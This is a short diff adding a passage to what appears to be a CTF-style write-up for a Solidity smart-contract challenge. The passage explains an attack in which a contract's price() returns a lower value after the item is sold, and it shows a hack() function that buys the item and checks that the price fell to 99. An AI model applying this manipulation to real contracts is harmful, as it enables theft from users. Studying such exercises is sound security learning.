@@ -34,3 +34,11 @@ function hack() external {
   }
 ```
 
+That will mimic the `price()` function but editing the return value after the item is sold. This makes us buy it at a lower price when we have our `hack()` function:
+```solidity
+function hack() external {
+    target.buy();
+    require(target.price() == 99, "price != 99");
+  }
+```
+
